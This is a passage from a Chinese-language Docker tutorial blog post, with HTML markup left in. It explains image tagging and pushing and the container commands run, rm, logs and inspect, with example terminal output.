class="hljs-number">1</span>.42kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>26c3bd3ae441c873a210200bcbb975ffd2bbf0c0841a4584f4476c8a5b8f3d99 529B / 529B                                                                             <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>d5ca7a4456053674d490803005766890dd19e3f7e789a48737c0d462da531f5d <span class="hljs-number">1</span>.48kB / <span class="hljs-number">1</span>.48kB                                                                         <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86 <span class="hljs-number">27</span>.17MB / <span class="hljs-number">27</span>.17MB                                                                      <span class="hljs-number">22</span>.6s<br> =&gt; =&gt; extracting <span class="hljs-symbol">sha256:</span>a39c84e173f038958d338f55a9e8ee64bb6643e8ac6ae98e08ca65146e668d86                                                                              <span class="hljs-number">0</span>.7s<br> =&gt; [internal] load build context                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 255B                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; [<span class="hljs-number">2</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">RUN</span> apt-get update &amp;&amp; apt-get install -y     nginx     &amp;&amp; rm -rf /var/lib/apt/lists/*                                                                       <span class="hljs-number">49</span>.7s<br> =&gt; [<span class="hljs-number">3</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">COPY</span> index.html /var/www/html/                                                                                                                               <span class="hljs-number">0</span>.0s <br> =&gt; exporting to image                                                                                                                                                 <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; exporting layers                                                                                                                                                <span class="hljs-number">0</span>.2s <br> =&gt; =&gt; writing image <span class="hljs-symbol">sha256:</span>fd09b8e38b0e75b933c83996e55146d4a59e2c62b13c0daec733177186923b39                                                                           <span class="hljs-number">0</span>.0s <br> =&gt; =&gt; naming to docker.io/library/my-nginx-image  <br></code></pre></td></tr></table></figure><h2 id="添加TAG"><a href="#添加TAG" class="headerlink" title="添加TAG"></a>添加TAG</h2><h3 id="docker-tag"><a href="#docker-tag" class="headerlink" title="docker tag"></a>docker tag</h3><p><strong>docker tag 镜像名称:镜像版本 镜像新名称:镜像新版本</strong></p><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>为镜像设置tag</p><h4 id="OPTIONS-5"><a href="#OPTIONS-5" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h4 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker tag grafana/grafana:8.2.6 grafana:8.2.6.1</span><br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># docker images</span><br>REPOSITORY        <span class="hljs-keyword">TAG</span>       <span class="hljs-title">IMAGE</span> ID       CREATED        SIZE<br>grafana/grafana   <span class="hljs-number">8.2</span>.<span class="hljs-number">6</span>     aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana           <span class="hljs-number">8.2</span>.<span class="hljs-number">6.1</span>   aeeaa96eea83   <span class="hljs-number">9</span> months ago   <span class="hljs-number">253M</span>B<br>grafana/grafana   <span class="hljs-number">6.3</span>.<span class="hljs-number">3</span>     a6e14b4109af   <span class="hljs-number">3</span> years ago    <span class="hljs-number">253M</span>B<br></code></pre></td></tr></table></figure><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><h3 id="docker-push"><a href="#docker-push" class="headerlink" title="docker push"></a><strong>docker push</strong></h3><p><strong>docker push [OPTIONS] NAME[:TAG]</strong></p><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>上传镜像到远程镜像仓库</p><h4 id="OPTIONS-6"><a href="#OPTIONS-6" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h5><p>–all-tags 上传所有tag的镜像到仓库</p><p>–disable-content-trust  关闭镜像签名校验，默认校验</p><p>-q</p><p>–quiet Suppress verbose output</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-<span class="hljs-selector-tag">image</span>:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository <span class="hljs-selector-attr">[registry.xxx.xxx.xxx.xxx/hours/my-nginx-image]</span><br><span class="hljs-number">0</span>c192a2bcb80: Pushed <br>bed1f48a7b1b: Pushed <br><span class="hljs-number">350</span>f36b271de: Layer already exists <br><span class="hljs-number">2.0</span>: digest: sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 size: <span class="hljs-number">948</span><br>➜  / docker push registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-<span class="hljs-selector-tag">image</span>:<span class="hljs-number">2.0</span> -<span class="hljs-selector-tag">q</span><br>registry<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/hours/my-nginx-<span class="hljs-selector-tag">image</span>:<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><h5 id="NAME-TAG"><a href="#NAME-TAG" class="headerlink" title="NAME[:TAG]"></a>NAME[:TAG]</h5><p>指定需要上传的镜像名或指定镜像TAG</p><p>不指定TAG，则使用默认TAG：latest</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><h6 id="不指定镜像仓库"><a href="#不指定镜像仓库" class="headerlink" title="不指定镜像仓库"></a>不指定镜像仓库</h6><p>默认会上传到 docker.io</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">➜  / docker push my-nginx-image<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> tag: latest<br>The push refers <span class="hljs-keyword">to</span> repository [docker.io/library/my-nginx-image]<br><span class="hljs-number">0</span>c192a2bcb80: Preparing <br><span class="hljs-symbol">bed1f48a7b1b:</span> Preparing <br><span class="hljs-number">350</span>f36b271de: Preparing <br><span class="hljs-symbol">denied:</span> requested access <span class="hljs-keyword">to</span> the resource <span class="hljs-built_in">is</span> denied<br></code></pre></td></tr></table></figure><h6 id="指定镜像仓库"><a href="#指定镜像仓库" class="headerlink" title="指定镜像仓库"></a>指定镜像仓库</h6><p>仓库域名&#x2F;项目名&#x2F;镜像名[:tag]</p><p>registry.xxx.xxx.xxx.xxx&#x2F;waf&#x2F;my-nginx-image:latest</p><h5 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h5><p>1、镜像添加tag</p><p>docker tag 镜像名:tag 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">➜  / docker tag <span class="hljs-keyword">my</span>-nginx-image:latest registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image:<span class="hljs-number">2.0</span><br><br>➜  / docker images | <span class="hljs-keyword">grep</span> <span class="hljs-number">2.0</span>     <br>registry.xxx.xxx.xxx.xxx/hours/<span class="hljs-keyword">my</span>-nginx-image     <span class="hljs-number">2.0</span>          fd09b8e38b0e   <span class="hljs-number">5</span> days ago      123MB<br></code></pre></td></tr></table></figure><p>2、上传镜像</p><p>可能需要登录，如果没有登录会提示（unauthorized: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push: unauthorized to access repository: waf&#x2F;my-nginx-image, action: push）</p><p>docker push 仓库域名&#x2F;项目名&#x2F;镜像名:tag</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/</span> docker push registry.xxx.xxx.xxx.xxx<span class="hljs-operator">/</span>hours<span class="hljs-operator">/</span>my-nginx-image:<span class="hljs-number">2.0</span>                                    <br>The push refers to repository [registry.xxx.xxx.xxx.xxx<span class="hljs-operator">/</span>hours<span class="hljs-operator">/</span>my-nginx-image]<br><span class="hljs-number">0</span><span class="hljs-params">c192a2bcb80:</span> Pushed <br><span class="hljs-params">bed1f48a7b1b:</span> Pushed <br><span class="hljs-number">350</span><span class="hljs-params">f36b271de:</span> Layer already exists <br><span class="hljs-number">2.0</span>: <span class="hljs-params">digest:</span> sha256:c0b08d64470340b8fc730b795e0d99f78da1595d5443ab97e7b51ab8bd057022 <span class="hljs-params">size:</span> <span class="hljs-number">948</span><br></code></pre></td></tr></table></figure><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p><p>docker run -itd  -p port1:port2 -v &#x2F;path:&#x2F;path IMAGE</p><p>dockerdocker二进制文件</p><p>run运行docker容器命令</p><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>创建并运行容器</p><h4 id="OPTIONS-7"><a href="#OPTIONS-7" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="–name-Name"><a href="#–name-Name" class="headerlink" title="–name  Name"></a>–name  Name</h5><p>设置容器名称</p><h5 id="i，–interactive"><a href="#i，–interactive" class="headerlink" title="-i，–interactive"></a>-i，–interactive</h5><p>Keep STDIN open even if not attached  为容器创建终端，即使没有连接</p><h5 id="t，–tty"><a href="#t，–tty" class="headerlink" title="-t，–tty"></a>-t，–tty</h5><p>Allocate a pseudo-TTY 为容器分配伪终端，允许你对容器内的标准输入进行交互</p><h5 id="d，–detch"><a href="#d，–detch" class="headerlink" title="-d，–detch"></a>-d，–detch</h5><p>Run container in background and print container ID  创建的容器运行在后台，输出容器id</p><h5 id="–rm"><a href="#–rm" class="headerlink" title="–rm"></a>–rm</h5><p>容器退出时自动清理容器内部的文件系统，不可与 -d 命令同时使用</p><p>只能自动清理 foreground 容器，不可自动清理 detached 容器，也会清理容器的匿名 data volumes</p><p>等价于容器退出后，执行 docker rm -v</p><h5 id="port1"><a href="#port1" class="headerlink" title="port1"></a>port1</h5><p>容器外端口，宿主机端口</p><h5 id="port2"><a href="#port2" class="headerlink" title="port2"></a>port2</h5><p>容器内端口</p><h5 id="IMAGE"><a href="#IMAGE" class="headerlink" title="IMAGE"></a>IMAGE</h5><p>镜像名</p><h5 id="v-path1-path2"><a href="#v-path1-path2" class="headerlink" title="-v &#x2F;path1:&#x2F;path2"></a>-v &#x2F;path1:&#x2F;path2</h5><p>挂载目录  &#x2F;path1 宿主机目录  &#x2F;path2 容器目录，也就是将宿主机挂载到容器中</p><h4 id="COMMAND"><a href="#COMMAND" class="headerlink" title="COMMAND"></a>COMMAND</h4><p>制定执行的命令，例如 &#x2F;bin&#x2F;bash 指定使用的bash</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  docker run -itd -<span class="hljs-keyword">p</span> <span class="hljs-number">8888</span>:<span class="hljs-number">80</span> -v /Users/admin/<span class="hljs-keyword">opt</span>/docker/:/<span class="hljs-keyword">opt</span>/ cento<span class="hljs-variable">s:7</span><br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> image <span class="hljs-string">&#x27;centos:7&#x27;</span> locally<br><span class="hljs-number">7</span>: Pulling from library/centos<br><span class="hljs-number">6717</span>b8ec66cd: Pull <span class="hljs-built_in">complete</span> <br>Digest: <span class="hljs-built_in">sha256</span>:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> cento<span class="hljs-variable">s:7</span><br><span class="hljs-number">0</span>fc471d9378c722e269c16673297223a77f1ba482bd67f0a4ad5f904bc9bd93f<br>➜  docker docker <span class="hljs-keyword">ps</span><br>CONTAINER ID   IMAGE      COMMAND       CREATED         STATUS         PORTS                  NAMES<br><span class="hljs-number">0</span>fc471d9378c   cento<span class="hljs-variable">s:7</span>   <span class="hljs-string">&quot;/bin/bash&quot;</span>   <span class="hljs-number">5</span> seconds ago   Up <span class="hljs-number">5</span> seconds   <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8888</span>-&gt;<span class="hljs-number">80</span>/tcp   gifted_banach<br></code></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>docker rm id</p><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>删除指定容器</p><h4 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker rm dbea3aafd585</span><br>dbea3aafd585<br></code></pre></td></tr></table></figure><h2 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h2><p><strong>docker logs [-f] id</strong></p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>查看容器的日志信息</p><h4 id="OPTIONS-8"><a href="#OPTIONS-8" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-1"><a href="#f-1" class="headerlink" title="-f"></a>-f</h5><p>查看实时日志</p><h4 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h4><p>查看实时日志</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">➜  /tmp docker logs -f <span class="hljs-number">61804</span>e0083af<br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>└─# ┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br></code></pre></td></tr></table></figure><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h3 id="docker-inspect-1"><a href="#docker-inspect-1" class="headerlink" title="docker inspect"></a>docker inspect</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>查看容器的基础数据</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># docker inspect 4b0e2ed242e0</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.271281387Z&quot;</span>,<br>        <span class="hljs-string">&quot;Path&quot;</span>: <span class="hljs-string">&quot;/run.sh&quot;</span>,<br>        <span class="hljs-string">&quot;Args&quot;</span>: [],<br>        <span class="hljs-string">&quot;State&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>,<br>            <span class="hljs-string">&quot;Running&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Paused&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Restarting&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OOMKilled&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Dead&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Pid&quot;</span>: <span class="hljs-number">1272</span>,<br>            <span class="hljs-string">&quot;ExitCode&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;StartedAt&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.547993902Z&quot;</span>,<br>            <span class="hljs-string">&quot;FinishedAt&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:aeeaa96eea830b988643e495b3978bff65dbdb997cc938ff5a4185a6bf3d7839&quot;</span>,<br>        <span class="hljs-string">&quot;ResolvConfPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/resolv.conf&quot;</span>,<br>        <span class="hljs-string">&quot;HostnamePath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hostname&quot;</span>,<br>        <span class="hljs-string">&quot;HostsPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hosts&quot;</span>,<br>        <span class="hljs-string">&quot;LogPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1-json.log&quot;</span>,<br>        <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;/amazing_brahmagupta&quot;</span>,<br>        <span class="hljs-string">&quot;RestartCount&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;Driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>        <span class="hljs-string">&quot;Platform&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;MountLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ProcessLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;AppArmorProfile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ExecIDs&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-string">&quot;HostConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Binds&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;ContainerIDFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LogConfig&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>                <span class="hljs-string">&quot;Config&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;NetworkMode&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,<br>            <span class="hljs-string">&quot;PortBindings&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;RestartPolicy&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;no&quot;</span>,<br>                <span class="hljs-string">&quot;MaximumRetryCount&quot;</span>: <span class="hljs-number">0</span><br>            &#125;,<br>            <span class="hljs-string">&quot;AutoRemove&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;VolumeDriver&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;VolumesFrom&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapDrop&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CgroupnsMode&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,<br>            <span class="hljs-string">&quot;Dns&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsOptions&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsSearch&quot;</span>: [],<br>            <span class="hljs-string">&quot;ExtraHosts&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;GroupAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;IpcMode&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>            <span class="hljs-string">&quot;Cgroup&quot;</span>: <span 